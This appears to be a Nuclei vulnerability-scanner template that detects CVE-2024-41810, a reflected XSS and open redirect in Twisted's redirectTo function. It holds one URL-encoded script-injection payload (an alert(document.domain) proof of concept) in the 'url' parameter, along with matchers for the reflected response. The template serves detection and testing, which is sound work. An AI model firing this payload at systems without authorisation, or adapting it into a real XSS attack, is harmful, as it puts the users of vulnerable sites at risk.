id: CVE-2024-41810

info:
  name: Twisted Redirect XSS
  author: KoYejune0302, cheoljun99, sim4110, gy741
  severity: medium
  description: |
    Twisted is an event-based framework for internet applications, supporting Python 3.6+.
    The Twisted web framework's redirectTo function is vulnerable to reflected XSS if an attacker can control the redirect URL.
    This template tests for an open redirect and XSS vulnerability in the URL parameter. This vulnerability is fixed in 24.7.0rc1.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2024-41810
  reference:
    - https://github.com/advisories/GHSA-cf56-g6w6-pqq2
    - https://nvd.nist.gov/vuln/detail/CVE-2024-41810
  tags: xss, unauth, open-redirect, twisted

requests:
  - method: GET
    path:
      - "{{BaseURL}}?url=ws%3A%2F%2Fexample.com%2F%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302

      - type: word
        words:
          - "Content-Type: text/html;"
        part: header

      - type: word
        words:
          - 'Location: ws://example.com/"><script>alert(document.domain)</script>'
        part: header

      - type: word
        words:
          - "alert(document.domain)"
        part: body
